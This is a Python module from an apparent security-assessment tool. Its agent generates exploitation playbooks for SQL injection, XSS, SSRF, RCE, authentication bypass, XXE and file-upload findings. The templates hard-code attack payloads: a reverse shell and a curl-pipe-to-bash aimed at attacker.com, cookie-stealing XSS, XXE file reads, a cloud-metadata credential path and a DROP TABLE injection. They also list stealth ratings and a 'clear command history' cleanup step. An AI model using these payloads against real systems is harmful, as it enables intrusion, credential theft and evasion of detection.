"""Playbook Agent — generates exploitation playbooks."""

from __future__ import annotations

import json
import logging
from dataclasses import asdict, dataclass, field
from typing import TYPE_CHECKING, Optional

from cybersentinel.agents.base import BaseAgent
from cybersentinel.models.finding import Finding, Severity

if TYPE_CHECKING:
    from cybersentinel.models.session import Session


logger = logging.getLogger(__name__)


@dataclass
class ExploitationPlaybook:
    """Complete exploitation playbook for a vulnerability."""

    title: str
    prerequisites: list[str] = field(default_factory=list)
    steps: list[str] = field(default_factory=list)
    example_payloads: list[str] = field(default_factory=list)
    expected_outcomes: list[str] = field(default_factory=list)
    detection_before: float = 0.3  # Detection probability during recon (0.0-1.0)
    detection_during: float = 0.5  # Detection probability during exploit
    detection_after: float = 0.4  # Detection probability during persistence
    stealth_rating: int = 5  # 1-10, 10 is stealthiest
    cleanup_steps: list[str] = field(default_factory=list)
    indicators_of_compromise: list[str] = field(default_factory=list)


class PlaybookAgent(BaseAgent):
    """Generates exploitation playbooks for vulnerabilities."""

    name = "playbook"
    description = "Generates exploitation playbooks for vulnerabilities"

    def __init__(self, session: Session):
        super().__init__(session)
        self.playbook_templates = self._initialize_templates()

    def analyze(self, target: str, context: dict) -> list[Finding]:
        """Generate exploitation playbooks for findings.

        Args:
            target: Target identifier
            context: Dict with 'findings' key containing Finding objects

        Returns:
            CRITICAL findings with playbooks in evidence
        """
        if not self.validate(target, "Exploitation playbook generation"):
            return []

        findings = context.get("findings", [])
        if not findings:
            return []

        new_findings = []

        for finding in findings:
            # Only create playbooks for high/critical severity findings
            if finding.severity.value not in ["critical", "high"]:
                continue

            playbook = self._generate_playbook(finding)
            if playbook:
                playbook_finding = Finding(
                    title=f"Exploitation Playbook: {finding.title}",
                    severity=Severity.CRITICAL,
                    description=self._format_playbook_description(playbook),
                    affected_component=finding.affected_component,
                    agent_source=self.name,
                    confidence="high",
                    evidence=self._format_playbook_evidence(playbook),
                )

                new_findings.append(playbook_finding)
                self.log(f"Generated playbook for: {finding.title}")

        return new_findings

    def _generate_playbook(self, finding: Finding) -> Optional[ExploitationPlaybook]:
        """Generate a playbook for a finding."""
        # Identify vulnerability type
        vuln_type = self._classify_vulnerability(finding)

        if vuln_type in self.playbook_templates:
            template = self.playbook_templates[vuln_type]
            return template(finding)

        # Fallback to generic RCE template
        return self.playbook_templates["rce"](finding)

    def _classify_vulnerability(self, finding: Finding) -> str:
        """Classify vulnerability type from finding."""
        title_lower = finding.title.lower()
        description_lower = finding.description.lower()

        vuln_types = {
            "sqli": ["sql injection", "sqli", "sql", "database query"],
            "xss": ["xss", "cross-site scripting", "reflected", "stored xss"],
            "ssrf": ["ssrf", "server-side request", "internal service"],
            "rce": ["rce", "remote code", "command execution", "command injection"],
            "auth_bypass": ["authentication bypass", "auth bypass", "broken auth", "weak auth"],
            "xxe": ["xxe", "xml external entity", "xml bomb"],
            "file_upload": ["file upload", "arbitrary upload", "file write"],
        }

        for vuln_type, keywords in vuln_types.items():
            for keyword in keywords:
                if keyword in title_lower or keyword in description_lower:
                    return vuln_type

        return "rce"

    def _initialize_templates(self) -> dict:
        """Initialize playbook templates for common vuln types."""
        return {
            "sqli": self._template_sqli,
            "xss": self._template_xss,
            "ssrf": self._template_ssrf,
            "rce": self._template_rce,
            "auth_bypass": self._template_auth_bypass,
            "xxe": self._template_xxe,
            "file_upload": self._template_file_upload,
        }

    def _template_sqli(self, finding: Finding) -> ExploitationPlaybook:
        """SQL Injection playbook template."""
        return ExploitationPlaybook(
            title="SQL Injection Exploitation",
            prerequisites=["Network access to target", "SQL injection point identified", "Database type known"],
            steps=[
                "Identify injection parameter",
                "Test injection with simple payload (e.g., ' OR '1'='1)",
                "Determine database type (MySQL, PostgreSQL, MSSQL, Oracle)",
                "Use UNION-based, blind, or time-based technique",
                "Extract data from database",
                "Establish persistence if possible",
            ],
            example_payloads=[
                "' OR '1'='1' -- -",
                "1' UNION SELECT NULL,username,password FROM users -- -",
                "1' AND SLEEP(5) -- -",
                "1'; DROP TABLE users; -- -",
            ],
            expected_outcomes=[
                "Unauthorized data access",
                "Database information disclosure",
                "Potential database modification",
            ],
            detection_before=0.4,
            detection_during=0.6,
            detection_after=0.3,
            stealth_rating=4,
            cleanup_steps=["Remove any tables/data created", "Check logs for suspicious queries"],
            indicators_of_compromise=[
                "Unusual SQL syntax in query logs",
                "Time-based delays in responses",
                "Database size changes",
            ],
        )

    def _template_xss(self, finding: Finding) -> ExploitationPlaybook:
        """Cross-Site Scripting playbook template."""
        return ExploitationPlaybook(
            title="Cross-Site Scripting (XSS) Exploitation",
            prerequisites=["Web application access", "XSS injection point identified", "JavaScript execution enabled"],
            steps=[
                "Identify reflection/storage point",
                "Craft XSS payload",
                "Test payload execution (alert box, DOM inspection)",
                "Escalate to session hijacking or credential theft",
                "Deliver to victim via social engineering",
                "Harvest data via payload callback",
            ],
            example_payloads=[
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=fetch('http://attacker.com?cookie='+document.cookie)>",
                "<iframe src=javascript:alert('XSS')>",
            ],
            expected_outcomes=[
                "Session token theft",
                "Credential harvesting",
                "Malware distribution",
                "Website defacement",
            ],
            detection_before=0.2,
            detection_during=0.3,
            detection_after=0.5,
            stealth_rating=6,
            cleanup_steps=["Remove injected script from application"],
            indicators_of_compromise=[
                "Suspicious JavaScript in HTML responses",
                "Unusual outbound connections from browser",
            ],
        )

    def _template_ssrf(self, finding: Finding) -> ExploitationPlaybook:
        """Server-Side Request Forgery playbook template."""
        return ExploitationPlaybook(
            title="Server-Side Request Forgery (SSRF) Exploitation",
            prerequisites=["Application can make outbound requests", "SSRF parameter identified"],
            steps=[
                "Identify SSRF parameter",
                "Test with internal URLs (localhost, 127.0.0.1)",
                "Query cloud metadata endpoint (169.254.169.254)",
                "Harvest credentials from metadata service",
                "Pivot to internal services (databases, admin interfaces)",
                "Escalate to internal network reconnaissance",
            ],
            example_payloads=[
                "http://localhost:8080/admin",
                "http://127.0.0.1:3306",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://internal-service:5000/api/admin",
            ],
            expected_outcomes=[
                "Cloud credential theft",
                "Internal service discovery",
                "Database access",
                "Authentication bypass",
            ],
            detection_before=0.3,
            detection_during=0.4,
            detection_after=0.2,
            stealth_rating=7,
            cleanup_steps=["Review access logs for internal IP queries"],
            indicators_of_compromise=[
                "Requests to internal IP ranges in server logs",
                "169.254.169.254 access",
                "Metadata endpoint queries",
            ],
        )

    def _template_rce(self, finding: Finding) -> ExploitationPlaybook:
        """Remote Code Execution playbook template."""
        return ExploitationPlaybook(
            title="Remote Code Execution (RCE) Exploitation",
            prerequisites=["Network access to vulnerable service", "Exploit code/payload", "Command execution privilege"],
            steps=[
                "Identify code execution vector",
                "Craft payload for target language/framework",
                "Test payload with simple command (id, whoami, hostname)",
                "Establish reverse shell",
                "Escalate privileges if needed",
                "Install persistence mechanism",
                "Pivot to other systems",
            ],
            example_payloads=[
                "'; exec('id'); --",
                "$(curl http://attacker.com/shell.sh | bash)",
                "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"attacker.com\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
                "${IFS}cat${IFS}/etc/passwd",
            ],
            expected_outcomes=[
                "Full system compromise",
                "Data exfiltration",
                "Ransomware deployment",
                "Lateral movement capability",
            ],
            detection_before=0.5,
            detection_during=0.7,
            detection_after=0.8,
            stealth_rating=2,
            cleanup_steps=["Remove shell scripts", "Kill reverse shell processes", "Clear command history"],
            indicators_of_compromise=[
                "Unexpected process spawning",
                "Network connections to attacker IP",
                "New user accounts created",
                "Web shell files on disk",
            ],
        )

    def _template_auth_bypass(self, finding: Finding) -> ExploitationPlaybook:
        """Authentication Bypass playbook template."""
        return ExploitationPlaybook(
            title="Authentication Bypass Exploitation",
            prerequisites=["Knowledge of authentication mechanism", "Bypass technique applicable"],
            steps=[
                "Analyze authentication logic",
                "Identify bypass vector (logic flaw, weak validation)",
                "Craft bypass attempt",
                "Test with various payloads",
                "Gain unauthorized access",
                "Access protected resources",
            ],
            example_payloads=[
                "admin' OR '1'='1",
                "admin\"; --",
                "admin'; --",
                "../../admin",
            ],
            expected_outcomes=[
                "Administrative access",
                "User account access",
                "Protected data access",
            ],
            detection_before=0.2,
            detection_during=0.3,
            detection_after=0.4,
            stealth_rating=8,
            cleanup_steps=["Review authentication logs"],
            indicators_of_compromise=[
                "Failed authentication attempts in logs",
                "Unusual login patterns",
            ],
        )

    def _template_xxe(self, finding: Finding) -> ExploitationPlaybook:
        """XML External Entity playbook template."""
        return ExploitationPlaybook(
            title="XML External Entity (XXE) Exploitation",
            prerequisites=["Application parses XML", "External entity processing enabled"],
            steps=[
                "Identify XML input point",
                "Test with XXE payload",
                "Read local files (/etc/passwd, config files)",
                "Perform port scanning via Blind XXE",
                "Extract data via out-of-band channels",
            ],
            example_payloads=[
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=data">]><foo>&xxe;</foo>',
            ],
            expected_outcomes=[
                "Local file disclosure",
                "Internal network scanning",
                "Denial of service",
            ],
            detection_before=0.3,
            detection_during=0.5,
            detection_after=0.2,
            stealth_rating=6,
            cleanup_steps=["Review XML parser logs"],
            indicators_of_compromise=[
                "Unusual XML in request logs",
                "File access patterns change",
            ],
        )

    def _template_file_upload(self, finding: Finding) -> ExploitationPlaybook:
        """File Upload playbook template."""
        return ExploitationPlaybook(
            title="Arbitrary File Upload Exploitation",
            prerequisites=["File upload functionality", "Insufficient validation"],
            steps=[
                "Identify upload endpoint",
                "Craft malicious file (web shell, executable)",
                "Bypass filename/type validation",
                "Upload file",
                "Access uploaded file",
                "Execute code or access data",
            ],
            example_payloads=[
                "shell.php (with PHP code)",
                "shell.asp (with ASP code)",
                "shell.jsp (with JSP code)",
                ".htaccess with AddType directive",
            ],
            expected_outcomes=[
                "Web shell access",
                "Remote code execution",
                "System compromise",
            ],
            detection_before=0.4,
            detection_during=0.5,
            detection_after=0.6,
            stealth_rating=5,
            cleanup_steps=["Delete uploaded malicious files"],
            indicators_of_compromise=[
                "Suspicious files in upload directory",
                "Web shell access attempts",
            ],
        )

    def _format_playbook_description(self, playbook: ExploitationPlaybook) -> str:
        """Format playbook description."""
        return (
            f"Complete exploitation playbook generated for {playbook.title}. "
            f"This playbook describes a step-by-step process an attacker could follow to exploit this vulnerability. "
            f"Stealth rating: {playbook.stealth_rating}/10. "
            f"Detection probabilities - Before: {playbook.detection_before:.0%}, "
            f"During: {playbook.detection_during:.0%}, After: {playbook.detection_after:.0%}."
        )

    def _format_playbook_evidence(self, playbook: ExploitationPlaybook) -> str:
        """Format playbook as evidence."""
        evidence = f"=== Exploitation Playbook: {playbook.title} ===\n\n"

        evidence += "Prerequisites:\n"
        for prereq in playbook.prerequisites:
            evidence += f"  • {prereq}\n"

        evidence += "\nExploitation Steps:\n"
        for i, step in enumerate(playbook.steps, 1):
            evidence += f"  {i}. {step}\n"

        evidence += "\nExample Payloads (NOT EXECUTED):\n"
        for payload in playbook.example_payloads:
            evidence += f"  • {payload}\n"

        evidence += "\nExpected Outcomes:\n"
        for outcome in playbook.expected_outcomes:
            evidence += f"  • {outcome}\n"

        evidence += f"\nDetection Probabilities:\n"
        evidence += f"  Before (Recon): {playbook.detection_before:.0%}\n"
        evidence += f"  During (Exploit): {playbook.detection_during:.0%}\n"
        evidence += f"  After (Persistence): {playbook.detection_after:.0%}\n"

        evidence += f"\nStealth Rating: {playbook.stealth_rating}/10\n"

        evidence += "\nCleanup Steps:\n"
        for step in playbook.cleanup_steps:
            evidence += f"  • {step}\n"

        evidence += "\nIndicators of Compromise:\n"
        for ioc in playbook.indicators_of_compromise:
            evidence += f"  • {ioc}\n"

        return evidence
